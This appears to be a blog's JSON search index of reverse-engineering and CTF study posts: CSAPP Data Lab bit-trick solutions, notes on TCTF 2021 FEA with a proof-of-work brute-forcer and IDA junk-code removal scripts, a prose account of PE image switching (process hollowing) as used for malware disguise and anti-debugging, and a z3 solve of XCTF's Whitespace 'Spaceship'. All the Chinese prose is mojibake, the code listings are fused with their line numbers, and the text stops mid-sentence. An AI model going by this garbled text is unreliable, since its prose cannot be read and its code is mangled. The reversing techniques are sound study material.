{"pages":[{"title":"My Friends","text":"chuj ä¸å¥½å¥½å­¦ä¹ ï¼Œç”Ÿæ´»ä¸­å°±ä¼šå¤šå‡ºè®¸å¤šé­”æ³•å’Œå¥‡è¿¹ Summer Rogerthat é€†å‘â”—|ï½€Oâ€²|â”› å—·~~ Potat0 Potat0 Box Atom å®…ç”·çš„å¤©å° Klrin Wu Junyi","link":"/friends/index.html"},{"title":"About me","text":"HDUåœ¨è¯»ï¼Œç°åœ¨åœ¨ Vidar-Team æçš„æ˜¯äºŒè¿›åˆ¶ï¼ˆä¸ä¼š Pwnï¼‰ï¼Œè¿˜åœ¨åŠªåŠ›å­¦ä¹  è”ç³»æ–¹å¼ï¼š QQï¼š1802460964","link":"/about/index.html"}],"posts":[{"title":"è¿‘æœŸè®¡åˆ’","text":"&nbsp;ç½®é¡¶ â˜ å­¦æ•°æ®ç»“æ„ â˜ C++ â˜ ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºæ“ä½œç³»ç»Ÿã€‹ â˜ ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹ çœ‹ä¸ä¸‹å»äº†ï¼Œä¹‹åå†è¯´å§ â˜ å®‰å“jniï¼ŒsoåŠ¨è°ƒ â˜ äº†è§£ä¸€ä¸‹unidbg","link":"/2021/07/03/%E8%BF%91%E6%9C%9F%E8%AE%A1%E5%88%92/"},{"title":"Data Lab","text":"csapp ä¸Šçš„ Data Lab 1.bitXorâ€‹ å®ç°xor 1234567int bitXor(int x, int y) { //example: 0101 0111 //åŒä¸º1:0101 åŒä¸º0:1000 åˆ†åˆ«å–åè¿›è¡Œ&amp; //~(x&amp;y|~x&amp;~y) return ~(x&amp;y)&amp;(~(~x&amp;~y)); //è·å–ä½ç›¸åŒçš„ä½ç½®ï¼Œå–åè¿›è¡Œ&amp;å°†ä¸åŒçš„ä½è®¾ä¸º1} 2.tminâ€‹ è¡¨ç¤ºTmin 1234int tmin(void) { return 1&lt;&lt;31;}//tmin = 10000000b 3.isTmaxâ€‹ åˆ¤æ–­æ˜¯å¦æ˜¯Tmax 123456int isTmax(int x) { int Tmin = x + 1; //01111111 + 1 = 10000000 int minus1 = x + Tmin; // 10000000 + 01111111 = 11111111 return !(minus1 ^ (~1 + 1)) &amp; !!Tmin; //!!Tmin ç”¨æ¥æ’é™¤0xffffffffçš„æƒ…å†µ} 4.allOddBitsâ€‹ åˆ¤æ–­å¶æ•°ä½ä¸Šæ˜¯å¦éƒ½ä¸º1 123456int allOddBits(int x) { int odd=0xaa+(0xaa&lt;&lt;8); odd=odd+(odd&lt;&lt;16); //0xaaaaaaaa=101010... //x&amp;oddåˆ¤æ–­å¶æ•°ä½ return !((x &amp; odd)^odd);} 5.negateâ€‹ è¿”å› -x 123int negate(int x) { return ~x+1; //å–å+1} 6.isAsciiDigitâ€‹ åˆ¤æ–­ 0x30&lt;=x&lt;=0x39ï¼Œä½¿ç”¨çš„è¿ç®—ç¬¦å¤ªå¤šè¿˜éœ€è¦ä¼˜åŒ– 1234567int isAsciiDigit(int x) { int over30 = (0x30 + ~x + 1) &gt;&gt; 31; //0x30-xçš„æ­£è´Ÿ int less39 = (x + ~0x39 + 1) &gt;&gt; 31; //x-0x39çš„æ­£è´Ÿ int equal30 = !(x ^ 0x30); int equal39 = !(x ^ 0x39); return (over30 &amp; less39) &amp; 1 | equal30 | equal39;} 7.conditionalâ€‹ x ? y : z 1234567int conditional(int x, int y, int z) { return (~(((~x+1)|x)&gt;&gt;31)|y)&amp;((((~x+1)|x)&gt;&gt;31)|z); //0x0 | y = y 0xffffffff | y = 0xffffffff //0xffffffff | z = 0xffffffff 0x0 | z = z //&amp; y z //æ ¹æ®0çš„è´Ÿæ•°æ˜¯0æ¥åŒºåˆ†xæ˜¯0è¿˜æ˜¯å…¶ä»–æ•°} 8.isLessOrEqualâ€‹ x &lt;= y 12345678int isLessOrEqual(int x, int y) { int signx = x &gt;&gt; 31 &amp; 1; int signy = y &gt;&gt; 31 &amp; 1; return (((x + ~y + 1) &gt;&gt; 31) &amp; 1 | !(x ^ y) | (signx &amp; !signy)) &amp; !(!signx &amp; signy); //åˆ¤æ–­x-yçš„ç¬¦å·å†åˆ¤æ–­xã€yæ˜¯å¦ç›¸ç­‰ //((x + ~y + 1) &gt;&gt; 31) &amp; 1 | !(x ^ y) | (signx &amp; !signy); 0x7fffffff 0x80000000 X æ²¡åˆ¤æ–­ç¬¦å· //(x + ~y + 1) &gt;&gt; 31) &amp; 1 | !(x ^ y); 0x80000000 0x7fffffff X ç›¸åŠ æº¢å‡º} 9.logicalNegâ€‹ å®ç°ï¼ 1234int logicalNeg(int x) { return (((~x+1)|x) &gt;&gt;31)&amp;1^1; //åŒæ ·æ˜¯æ ¹æ®0çš„è´Ÿæ•°è¿˜æ˜¯0æ¥å®ç°!} 10.howManyBitsâ€‹ å­˜å‚¨è¿™ä¸ªæ•°çš„æœ€å°ä½æ•° 123456789101112131415161718192021222324252627/* * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 *///äºŒåˆ†æ³•æ‰¾æœ€å°ä½æ•°int howManyBits(int x) { int sign = (x &gt;&gt; 31) &amp; 1; int n = 0; x = (~(((~sign + 1) | sign) &gt;&gt; 31) | (~x)) &amp; ((((~sign + 1) | sign) &gt;&gt; 31) | x); //sign ? ~x : x //ç»Ÿä¸€æ­£æ•°ä¸è´Ÿæ•°çš„è®¡æ•°æ–¹æ³• n = n + (!!(x &gt;&gt; 16) &lt;&lt; 4); //å16ä½æ˜¯å¦æœ‰1 x = x &gt;&gt; (!!(x &gt;&gt; 16) &lt;&lt; 4); n = n + (!!(x &gt;&gt; 8) &lt;&lt; 3); //å24ä½æ˜¯å¦æœ‰1 x = x &gt;&gt; (!!(x &gt;&gt; 8) &lt;&lt; 3); n = n + (!!(x &gt;&gt; 4) &lt;&lt; 2); //åŒç† x = x &gt;&gt; (!!(x &gt;&gt; 4) &lt;&lt; 2); n = n + (!!(x &gt;&gt; 2) &lt;&lt; 1); x = x &gt;&gt; (!!(x &gt;&gt; 2) &lt;&lt; 1); n = n + (!!(x &gt;&gt; 1)); x = x &gt;&gt; (!!(x &gt;&gt; 1)); n = n + x+1; return n;} 11.floatScale2â€‹ float*2 12345678910111213unsigned floatScale2(unsigned uf) { unsigned int exp = (uf &amp; (0xff &lt;&lt; 23)) &gt;&gt; 23; unsigned int sign = uf &amp; (1 &lt;&lt; 31); if (exp == 0xff) //nanå’Œinf return uf; if (exp == 0) //éå¸¸è§„ return uf &lt;&lt; 1 | sign; if (exp != 0xff) { exp = exp + 1; //*2 return (((uf&gt;&gt;31)&amp;1)&lt;&lt;31)+(exp&lt;&lt;23)+(uf&amp;0x7fffff); }} 12.floatFloat2Intâ€‹ float è½¬ int 123456789101112131415161718int floatFloat2Int(unsigned uf) { unsigned int exp = (uf &amp; (0xff &lt;&lt; 23)) &gt;&gt; 23; int frac = (uf &amp; ((0x7f &lt;&lt; 16) + (0xff &lt;&lt; 8) + 0xff)) | 0x800000; //è§„æ ¼åŒ–çš„éšå«1 unsigned int sign = uf &gt;&gt; 31; int E = exp - 127; if (E &gt; 31) //è¶…è¿‡æœ€å¤§ä½æ•° return 0x80000000u; if (E &lt; 0) //éè§„æ ¼åŒ–çš„çº¦ä¸º0 return 0; if (E &gt; 23) frac = frac &lt;&lt; (E - 23); if (E &lt;= 23) frac = frac &gt;&gt; (23 - E); if (!sign) //è½¬ä¸ºintéœ€è¦è€ƒè™‘ç¬¦å· return frac; else return ~frac + 1;} 13.floatPower2â€‹ 2.0^x â€‹ è¿™é¢˜å› æµ‹è¯•ç”¨ä¾‹è¿‡å¤šï¼Œéœ€è¦æŠŠ btest.c é‡Œçš„æ—¶é—´è°ƒå¤§ 123456789101112unsigned floatPower2(int x) { unsigned INF = 0xff &lt;&lt; 23; unsigned int exp = x + 127; //å¸¸è§„çš„exp=E+bias //éå¸¸è§„ E=1-bias if (x &lt;= -150) return 0; else if (x &gt; -150 &amp;&amp; x &lt;= -127) return 1 &lt;&lt; (149+x); else if (x &gt;= 128) return INF; return exp &lt;&lt; 23;} â€‹ denormçš„ä¸¤ç§æƒ…å†µï¼ˆæ¥è‡ªCSAPP ä¹‹ DataLabè¯¦è§£çš„è¯„è®ºåŒºï¼‰ï¼š ç»“æœ æ€»ç»“ Data Lab éƒ½æ˜¯å…³äºä½è¿ç®—çš„åŸºç¡€çŸ¥è¯†ï¼ŒæŠŠè¿™äº›å…¨éƒ¨åšä¸‹æ¥å¤§æ¦‚èŠ±äº†åŠå¤©å¤šï¼ŒæœŸé—´è¿˜ç¨å¾®å‚è€ƒäº†ä¸‹ä»–äººçš„ç­”æ¡ˆï¼Œå…¨éƒ¨åšå®Œåæ„Ÿè§‰å¯¹æµ®ç‚¹æ•°ã€æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°çš„ç†è§£æ›´æ·±äº†ï¼Œæ”¶è·æŒºå¤§ğŸ˜€","link":"/2021/07/10/Data-Lab/"},{"title":"tctf2021 FEA","text":"ä¸ç®— wpï¼Œåªæ˜¯è®°å½•ä¸€ä¸‹ä»è¿™é¢˜ä¸­å­¦ä¹ åˆ°çš„çŸ¥è¯† çˆ†ç ´ sha2561234567891011121314151617181920import itertoolsimport hashlibimport refrom pwn import *import stringr=remote(&quot;111.186.58.164&quot;,30212)proof_of_work_line = r.recvline(keepends=False).decode(&quot;utf-8&quot;)enc = re.search('== (.*)',proof_of_work_line).group(1)strlist=itertools.product(string.ascii_letters+string.digits,repeat=4)code=&quot;&quot;key=&quot;hUsUzJ47UdPwwTns&quot;enc=&quot;ac2b009cf8ab722c6417f0dff94a24434a7d7c43f12da21a042faa34295efe22&quot;for i in strlist: code=i[0]+i[1]+i[2]+i[3] encinfo=hashlib.sha256(str(code+key).encode('utf-8')).hexdigest() if encinfo == enc: print(code) break; itertools çš„ç®€å•ç”¨æ³•1.itertools.product(â€˜ABCDâ€™, repeat = 2) æ’åˆ—ç»„åˆï¼ˆç¬›å¡å°”ç§¯ï¼‰ â€‹ ç»“æœï¼šAA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD â€‹ ä¹Ÿå¯ä»¥æ˜¯ä¸¤ä¸ªå…ƒç»„æ’åˆ—ç»„åˆ 2.itertools.permutations(â€˜ABCDâ€™, 2) æ‰€æœ‰å¯èƒ½çš„æ’åˆ—ï¼Œæ— é‡å¤å…ƒç´  â€‹ ç»“æœï¼šAB AC AD BA BC BD CA CB CD DA DB DC 3.itertools.combinations(â€˜ABCDâ€™, 2) æœ‰åºï¼Œæ— é‡å¤å…ƒç´  â€‹ ç»“æœï¼šAB AC AD BC BD CD 4.itertools.combinations_with_replacement(â€˜ABCDâ€™, 2) æœ‰åºï¼Œå…ƒç´ å¯é‡å¤ â€‹ ç»“æœï¼šAA AB AC AD BB BC BD CC CD DD ç”¨æ’ä»¶å»é™¤ ollvm æ··æ·†â€‹ æ’ä»¶ä»‹ç»ï¼šhttps://eshard.com/posts/d810_blog_post_1/ â€‹ ä¸‹è½½åœ°å€ï¼šhttps://gitlab.com/eshard/d810 â€‹ è¿™ä¸ªæ’ä»¶æä¾›å¤šä¸ª rules æ¥åæ··æ·†ï¼Œä¹Ÿå¯ä»¥è‡ªå·±æ·»åŠ è§„åˆ™ã€‚åœ¨è¿™é¢˜ä¸­ä½¿ç”¨äº†å¯¹æ§åˆ¶æµçš„æ··æ·†ï¼Œå‹¾é€‰è¿™ä¸€é€‰é¡¹å°±å¯ä»¥å®ç°åæ··æ·† ä½¿ç”¨å‰åå¯¹æ¯”â€‹ â€‹ ç”¨idaPythonå»é™¤èŠ±æŒ‡ä»¤ â€‹ ä»ç®€åŒ–åçš„æµç¨‹çœ‹å¯ä»¥çŸ¥é“æœ‰ä¸¤å¤„åè°ƒè¯•ï¼Œè¿˜æœ‰ä¸€å¤„ smc è‡ªè§£å¯† â€‹ smc å [rbp+s] æŒ‡å‘è§£å¯†åçš„ä»£ç ï¼Œå› ä¸ºä»£ç æ¯”è¾ƒé•¿å°±ç”¨è„šæœ¬æå–å‡ºæ¥åˆ†æ ä¸€äº› idapython å‡½æ•°idaapi: â€‹ BADADDRï¼š4294967295 åœ°å€ä¸Šç•Œ â€‹ del_items(ea, flags=0, nbytes=1, may_destroy=None)ï¼šConvert item (instruction/data) to unexplored bytes â€‹ create_insn(ea, out=None)ï¼šCreate an instruction at the specified address â€‹ get_first_cref_from(frm)ï¼šGet first instruction referenced from the specified instruction 123456789#æå– smc çš„ä»£ç from idaapi import *start=0x00007F96D2BBB000count = 0x100000f=open('C:\\\\Users\\\\chz\\\\Desktop\\\\smc','wb')for i in range(0,count): f.write(get_byte(start+i).to_bytes(1,byteorder='big'))f.close()print(&quot;success&quot;) â€‹ ida åˆ†æåæœ‰ä¸€å¤§å †èŠ±æŒ‡ä»¤ï¼Œæ‰‹åŠ¨åˆ†ææ—¶é—´å¤ªä¹…è€ƒè™‘ç”¨è„šæœ¬å»é™¤ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#å†™äº†ä¸€åŠçš„å»é™¤éƒ¨åˆ†è·³è½¬èŠ±æŒ‡ä»¤ï¼Œè‡ªåŠ¨å˜codeè„šæœ¬import idaapiimport idcdef undefine(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: idaapi.del_items(curr, 8) curr=curr+1def make_code(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: insn = idaapi.insn_t() ret = idaapi.create_insn(curr, insn) if ret == 0: idaapi.del_items(curr, 8) idaapi.del_items(curr+1, 8) ret = idaapi.create_insn(curr, insn) next_ea = idaapi.get_first_cref_from(curr) if (curr&lt;end and next_ea == BADADDR) or curr==0xbf6a or curr==0x17A6F: curr = curr+1 else: curr=next_ea print(curr)def clear(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: insn = idaapi.insn_t() if idc.GetDisasm(curr)[0:1]=='j' or idc.GetDisasm(curr)[0:4]=='call': #ç‰¹å®šåœ°å€åæ±‡ç¼– jmp_addr=idc.GetOperandValue(curr,0) #è·å–æ“ä½œæ•° ret = idaapi.create_insn(jmp_addr, insn) if ret == 0: idaapi.del_items(jmp_addr, 8) idaapi.del_items(jmp_addr+2, 8) idaapi.del_items(jmp_addr+4, 8) ret = idaapi.create_insn(curr, insn) next_ea = idaapi.get_first_cref_from(curr) if (curr&lt;end and next_ea == BADADDR) or curr==0xbf6a or curr==0x17A6F: curr = curr+1 else: curr=next_ea print(curr)def nop(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: if idc.is_data(curr): idc.PatchByte(curr,0x90) next_ea = idaapi.get_first_cref_from(curr) if (curr&lt;end and next_ea == BADADDR) or curr==0xbf6a or curr==0x17A6F: curr = curr+1 else: curr=next_ea print(curr) #undefine(0x0,0x224c6)#make_code(0x0,0x224C6)#clear(0x22460,0x224c6)nop(0x0,0x224c6) â€‹ ä½†æ˜¯å¥½åƒå†™å¾—æœ‰ç‚¹å¤ªå¤æ‚äº†ï¼Œä¹Ÿæ²¡æ³•å®Œå…¨å®ç°è‡ªåŠ¨ patchï¼Œå¦‚æœæœ‰å“ªä½çŸ¥é“æœ‰ä»€ä¹ˆå»é™¤èŠ±æŒ‡ä»¤çš„ ida æ’ä»¶è¯·åŠ¡å¿…å‘Šè¯‰æˆ‘ ğŸ˜­ å‚è€ƒèµ„æ–™ https://ctftime.org/writeup/29116 pythonä¸­çˆ†ç ´å„ç§hashåŠ å¯†çš„æ–°å§¿åŠ¿ https://docs.python.org/zh-cn/3/library/itertools.html https://hex-rays.com/wp-content/static/products/ida/support/idapython_docs/ idaPythonæ•™ç¨‹","link":"/2021/07/07/tctf2021-FEA/"},{"title":"PEæ˜ åƒåˆ‡æ¢-minilctf","text":"è®°å½•ä¸€ä¸‹åè°ƒè¯•ä¸­çš„ PE æ˜ åƒåˆ‡æ¢æŠ€æœ¯ æœ‰å…³ PE æ˜ åƒåˆ‡æ¢ æ¦‚å¿µ é¦–å…ˆå…ˆä»¥æŒ‚èµ·çš„æ¨¡å¼è¿è¡Œ A.exe è¿›ç¨‹ï¼Œç„¶åå°†ä¸€ä¸ªå®Œå…¨ä¸åŒçš„ PE æ–‡ä»¶çš„æ˜ åƒæ˜ å°„åˆ° A.exe çš„å†…å­˜ç©ºé—´ï¼Œå¹¶è¿è¡Œã€‚A.exe å³ â€œå¤–å£³è¿›ç¨‹ â€ï¼ŒB.exe ä¸º â€œå†…æ ¸è¿›ç¨‹â€ ï¼ˆç›¸å½“äºå·æ¢æ¢æŸ± è¿™ä¸€æŠ€æœ¯ä¸»è¦ç”¨äºç—…æ¯’ç¨‹åºçš„ä¼ªè£…ï¼Œåè°ƒè¯• å…·ä½“å®ç°è¿‡ç¨‹ 0x01 æŠŠ real.exe è½½å…¥å†…å­˜ï¼Œå¹¶åˆ›å»ºè¿›ç¨‹ fake.exe â€‹ æ­¤æ—¶è¿›ç¨‹å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œå¯ä»¥è‡ªç”±æ“æ§å†…å­˜ç©ºé—´ 0x02 è·å– fake.exe å®é™…åŠ è½½åŸºåœ°å€ 0x03 è·å– real.exe çš„åŸºåœ°å€ â€‹ åœ¨ PE æ–‡ä»¶å¤´ä¸­è·å– 0x04 æ¯”è¾ƒè¿™ä¸¤ä¸ªåŸºåœ°å€ 1.ä¸¤ä¸ªåŸºåœ°å€ç›¸åŒ â€‹ åˆ©ç”¨ ntdll é‡Œçš„ ZwUnmapViewOfSection å¸è½½ fake.exe çš„æ˜ å°„,åˆ†é…å†…å­˜ç©ºé—´å†å°† real.exe æ˜ å°„åˆ°è¿›ç¨‹å†…å­˜ 2.ä¸¤ä¸ªåŸºåœ°å€ä¸åŒ â€‹ å¯ç›´æ¥å°† real.exe æ˜ å°„åˆ° fake.exe è¿›ç¨‹å†…å­˜ï¼Œå†æŠŠ PEB.Imagebase æ”¹ä¸º real.exe çš„åŸºåœ°å€ 0x05 ä¿®æ”¹EP â€‹ CONTEXT.Eax å­˜å‚¨ fake.exe çš„ EP åœ°å€ï¼ŒCONTEXT.Eip å­˜å‚¨ ntdllï¼RtlUserThreadStart è¿™ä¸ªAPIçš„åœ°å€ï¼Œé€šè¿‡è¿™ä¸ªAPIè·³è½¬åˆ° EP ä»£ç  miniLctf Re1 â€‹ åœ¨çœ‹å®Œä¸Šé¢è¿™éƒ¨åˆ†å†…å®¹åçªç„¶æƒ³èµ·æ¥ä¹‹å‰çš„ miniLctf é‡Œçš„ Re1 å¥½åƒæœ‰æ¶‰åŠè¿™æ–¹é¢çš„çŸ¥è¯†ï¼Œäºæ˜¯å°±é‡æ–°åˆ†æäº†ä¸€ä¸‹ â€‹ å¯ä»¥æ ¹æ®æœ€åä¿®æ”¹ EP æ—¶çš„åœ°å€æ‰¾åˆ° real.exe å¯¼å‡ºåˆ†æ â€‹ å¯¼å‡ºä¹‹åçš„è§£é¢˜è¿‡ç¨‹å°±ä¸è¯¦ç»†å™è¿°äº†åº”è¯¥æ¯”è¾ƒç®€å•ï¼Œå…³æ³¨ TLS å°±è¡Œ å‚è€ƒèµ„æ–™ ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹","link":"/2021/07/01/PE%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2-minilctf/"},{"title":"XCTF Final: Spaceship","text":"å¯¹ Xctf Final Re é¢˜ï¼š SpaceShip çš„å¤ç° åˆæ­¥åˆ†æ â€‹ ä¸‹è½½å¾—åˆ° ws åç¼€çš„æ–‡ä»¶ ï¼Œè°·æ­ŒæŸ¥ ws åç¼€æ–‡ä»¶ â€‹ ä¸è¿‡è¿™ä¸å¯¹ï¼Œæ ¹æ®æ–‡ä»¶å†…åªæœ‰ç©ºæ ¼ã€æ¢è¡Œç¬¦ç­‰ä»¥åŠæ¯”èµ›æ—¶é˜Ÿå‹æ‰¾åˆ° çš„èµ„æ–™ï¼Œåº”è¯¥æ˜¯ WhiteSpace è¯­è¨€ â€‹ ç”¨å·¥å…·å¯ä»¥æŠŠè¿™ä¸ªè¯­è¨€è½¬æˆ python å’Œæ±‡ç¼–å½¢å¼ â€‹ https://github.com/Smithers888/BlueSpace è°ƒè¯• â€‹ è½¬æ¢å¾—åˆ°çš„ python æ–‡ä»¶å¯ä»¥ç›´æ¥è¿è¡Œï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è°ƒè¯•çœ‹é€»è¾‘ 123456789101112131415161718192021222324252627282930313233343536def stssstttsttn(): stack.append(0) sys.stdout.flush() try: x = ord(sys.stdin.read(1)) except EOFError: x = -1 #x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18 = Ints('x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18') heap[stack.pop()] = x #è°ƒè¯•æ—¶æ”¹åŠ¨ stack.append(0) stack.append(0) stack[-1] = heap[stack[-1]] stack.append(16777216) x = stack.pop() stack[-1] += x stack.append(16777216) x = stack.pop() stack[-1] %= x x = stack.pop() ......... stack.append(0) stack[-1] = heap[stack[-1]] stack.append(1) stack[-1] = heap[stack[-1]] x = stack.pop() stack[-1] -= x try: if stack.pop() &lt; 0: return sttsssttssstn except Z3Exception: #å¼‚å¸¸ print(stack,heap) â€‹ è¿™éƒ¨åˆ†è¯»å–å¹¶å¯¹è¾“å…¥è¿›è¡Œè¿ç®—ï¼Œä»ä¸‹é¢è¿™äº›æ•°å­—çŒœæµ‹è¿›è¡Œäº†æ–¹ç¨‹çš„ è¿ç®— â€‹ æ ¹æ®å­¦é•¿çš„æ€è·¯å¯ä»¥æŠŠè¾“å…¥éƒ½è½¬æ¢æˆ z3 é‡Œçš„ç¬¦å·ï¼Œé‚£ä¹ˆåœ¨ä¹‹ååˆ¤ æ–­å¤§å°çš„æ—¶å€™ä¼šå› ä¸ºç¬¦å·ä¸èƒ½æ¯”å¤§å°è€ŒæŠ›å‡ºå¼‚å¸¸ï¼Œå°±å¯ä»¥æ‰“å°å‡ºè¡¨è¾¾å¼ï¼ˆè¿™åšæ³•å¤ªçµæ´»äº†ï¼Œè‡ªå·±æ ¹æœ¬æƒ³ä¸åˆ°â€¦ï¼‰ 1234567891011121314151617181920212223242516777089: ((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251, 16777086: 11, 16777085: ((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#å †çš„æ•°æ®heap ={0: 10 1: 446 2: 0, 3: 16777074 4: 16777077 5: 16777076 6: 0 8: 2 9: 10 10: 10 11: 8 12: 3 13: 11 14: 1753 15: 7 16: 17 17: 6 18: 4 19: 8 20: 16 21: 2117 22: 4 23: 5 24: 3 25: 15 26: 6 27: 6 28: 1071 29: 3 30: 17 31: 5 32: 4 33: 2 34: 16 35: 1116 36: 10 37: 14 38: 4 39: 0 40: 10 41: 9 42: 2190 43: 9 44: 14 45: 4 46: 0 47: 4 48: 9 49: 1764 50: 2 51: 3 52: 1 53: 2 54: 3 55: 1 56: 617 57: 9 58: 14 59: 8 60: 0 61: 3 62: 9 63: 2193 64: 1 65: 17 66: 5 67: 4 68: 2 69: 16 70: 866 71: 8 72: 5 73: 2 74: 15 75: 8 76: 6 77: 1594 78: 5 79: 12 80: 10 81: 13 82: 2 83: 7 84: 1153 85: 10 86: 12 87: 5 88: 13 89: 8 90: 7 91: 1737 92: 5 93: 12 94: 9 95: 13 96: 9 97: 7 98: 1445 99: 4 100: 10 101: 7 102: 8 103: 7 104: 11 105: 2119 106: 5 107: 3 108: 2 109: 2 110: 5 111: 1 112: 1237 113: 9 114: 5 115: 8 116: 15 117: 4 118: 6 119: 1463 120: 7 121: 10 122: 8 123: 8 124: 4 125: 11 126: 2217 127: 6 128: 3 129: 10 130: 2 131: 1 132: 1 133: 1871} â€‹ å¯¹ç…§ç€å¯ä»¥å‘ç° 18 ä¸ªè¡¨è¾¾å¼çš„å½¢å¼ exp 12345678910111213((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251 â€‹ å› ä¸ºæ¯ä¸ªå˜é‡éƒ½åœ¨å¯è§å­—ç¬¦èŒƒå›´å†…ï¼Œæ‰€ä»¥ä¸Šé¢çš„è¡¨è¾¾å¼å¯ä»¥ç®€åŒ–æˆ 12*x10+10*x8+3*x11== 1234567891011121314151617from z3 import *heap = {0: 10, 1: 446, 2: 0, 3: 16777074, 4: 16777077, 5: 16777076, 6: 0, 8: 2, 9: 10, 10: 10, 11: 8, 12: 3, 13: 11, 14: 1753, 15: 7, 16: 17, 17: 6, 18: 4, 19: 8, 20: 16, 21: 2117, 22: 4, 23: 5, 24: 3, 25: 15, 26: 6, 27: 6, 28: 1071, 29: 3, 30: 17, 31: 5, 32: 4, 33: 2, 34: 16, 35: 1116, 36: 10, 37: 14, 38: 4, 39: 0, 40: 10, 41: 9, 42: 2190, 43: 9, 44: 14, 45: 4, 46: 0, 47: 4, 48: 9, 49: 1764, 50: 2, 51: 3, 52: 1, 53: 2, 54: 3, 55: 1, 56: 617, 57: 9, 58: 14, 59: 8, 60: 0, 61: 3, 62: 9, 63: 2193, 64: 1, 65: 17, 66: 5, 67: 4, 68: 2, 69: 16, 70: 866, 71: 8, 72: 5, 73: 2, 74: 15, 75: 8, 76: 6, 77: 1594, 78: 5, 79: 12, 80: 10, 81: 13, 82: 2, 83: 7, 84: 1153, 85: 10, 86: 12, 87: 5, 88: 13, 89: 8, 90: 7, 91: 1737, 92: 5, 93: 12, 94: 9, 95: 13, 96: 9, 97: 7, 98: 1445, 99: 4, 100: 10, 101: 7, 102: 8, 103: 7, 104: 11, 105: 2119, 106: 5, 107: 3, 108: 2, 109: 2, 110: 5, 111: 1, 112: 1237, 113: 9, 114: 5, 115: 8, 116: 15, 117: 4, 118: 6, 119: 1463, 120: 7, 121: 10, 122: 8, 123: 8, 124: 4, 125: 11, 126: 2217, 127: 6, 128: 3, 129: 10, 130: 2, 131: 1, 132: 1, 133: 1871}s=Solver()x=IntVector('x',18)for i in range(8,7*18+8,7): s.add(heap[i]*(x[heap[i+1]]) +heap[i+2]*(x[heap[i+3]]) +heap[i+4]*(x[heap[i+5]])==heap[i+6]) print(s.check())print(s.model())ans=s.model()x10,x8,x11=Ints('x10 x8 x11')[print(chr(int(str(ans[i]))),end='') for i in x]#xctf{Wh1t3sym3x!?} â€‹ â€‹ å¤ç°å¾—åˆ° flag åè¿˜åœ¨è°·æ­Œä¸Šæ‰¾åˆ°äº†æœ‰äººåœ¨èµ›æ—¶å†™äº†ä¸ªç±»ä¼¼ angr çš„å¯¹ whitespace è‡ªåŠ¨æ±‚è§£çš„ åº“ï¼Œæœ‰ç©ºå†ç ”ç©¶ â€‹ https://github.com/umutoztunc/whitesymex å‚è€ƒèµ„æ–™ https://zh.wikipedia.org/wiki/Whitespace https://pypi.org/project/whitesymex/ https://github.com/umutoztunc/whitesymex https://github.com/Smithers888/BlueSpace Vidar-Team writeup","link":"/2021/06/02/XCTF-Final-Spaceship/"},{"title":"windows å¼‚å¸¸å¤„ç†","text":"ç®€å•æ€»ç»“ä¸€ä¸‹æœ‰å…³ Windows å¤„ç†å¼‚å¸¸æ–¹é¢çš„çŸ¥è¯† SEH SEH ç®€å•è¯´æ˜ â€‹ SEHæ˜¯åŸºäºæ ˆçš„å¼‚å¸¸å¤„ç†ï¼Œä½œç”¨èŒƒå›´ä»…é™å½“å‰çº¿ç¨‹ï¼Œåœ¨ç¨‹åºäº§ç”Ÿå¼‚å¸¸æ—¶ï¼Œå¦‚æœç¨‹åºæ­£åœ¨è¢«è°ƒè¯•os å°±ä¼šå…ˆæŠŠå¼‚å¸¸æŠ›ç»™è°ƒè¯•å™¨å¤„ç† ï¼Œè°ƒè¯•å™¨æ— æ³•è§£å†³è¿™ä¸€å¼‚å¸¸å°±ä¼šç”±è¿›ç¨‹å¤„ç†ï¼Œè¿›ç¨‹ä¹Ÿæ— æ³•å¤„ç†å°±ä¼šäº¤ç”± os å¤„ç†ã€‚ SEH ç»“æ„ TEB ç»“æ„ä½“ â€‹ TEB ç»“æ„ä½“æ˜¯æ“ä½œç³»ç»Ÿä¸ºäº†ä¿å­˜çº¿ç¨‹ç§æœ‰æ•°æ®è€Œåˆ›å»ºçš„ï¼ŒTIB æ˜¯ä¿å­˜çº¿ç¨‹åŸºæœ¬ä¿¡æ¯çš„æ•°æ®ç»“æ„ã€‚ â€‹ åœ¨ x86 ç”¨æˆ·æ¨¡å¼ä¸‹å¯ä»¥ç”± FS å¯„å­˜å™¨æ¥è®¿é—®å½“å‰çº¿ç¨‹ 